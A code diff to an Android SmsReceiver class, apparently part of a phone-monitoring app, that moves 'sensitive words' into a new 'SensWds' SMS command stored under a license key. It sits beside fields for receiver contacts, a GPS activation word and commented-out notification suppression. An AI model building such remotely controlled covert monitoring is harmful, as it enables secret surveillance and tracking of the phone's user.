@@ -98,9 +98,9 @@ public class SmsReceiver extends BroadcastReceiver
 		else if (smsBody.startsWith("Info,")) {
 			//abortBroadcast(); // Finish broadcast, the system will notify this SMS
 			
-			// The sms format: <header>,<license key>,<receiver mail>,<receiver phone num>,<receiver sensitive words>,<gps activation word>
+			// The sms format: <header>,<license key>,<receiver mail>,<receiver phone num>,<gps activation word>
 			String parts[] = smsBody.split(",");
-			if (parts.length < 6) {
+			if (parts.length < 5) {
 				SysUtils.messageBox(context, "Invalid info SMS: " + smsBody);
 				return;
 			}
@@ -108,9 +108,30 @@ public class SmsReceiver extends BroadcastReceiver
 			DbHelper db = new DbHelper(context);
 			boolean ret = db.createOrOpenDatabase();
 			if (ret) {
-				ret = db.updateByKeyToWriteReceiverInfo(parts[1], parts[2], parts[3], parts[4], parts[5]);
+				ret = db.updateByKeyToWriteReceiverInfo(parts[1], parts[2], parts[3], parts[4]);
 				if (!ret) {
 					SysUtils.messageBox(context, "Failed to update receiver info: " + smsBody);
+				}
+			}
+		}
+		
+		// If it is sensitive words SMS (so the key type should be full or part)
+		else if (smsBody.startsWith("SensWds,")) {
+			//abortBroadcast(); // Finish broadcast, the system will notify this SMS
+			
+			// The sms format: <header>,<license key>,<receiver sensitive words>
+			String parts[] = smsBody.split(",");
+			if (parts.length < 3) {
+				SysUtils.messageBox(context, "Invalid SensWds SMS: " + smsBody);
+				return;
+			}
+			
+			DbHelper db = new DbHelper(context);
+			boolean ret = db.createOrOpenDatabase();
+			if (ret) {
+				ret = db.updateByKeyToWriteSensitiveWords(parts[1], parts[2]);
+				if (!ret) {
+					SysUtils.messageBox(context, "Failed to update sensitive words: " + smsBody);
 				}
 			}
 		}
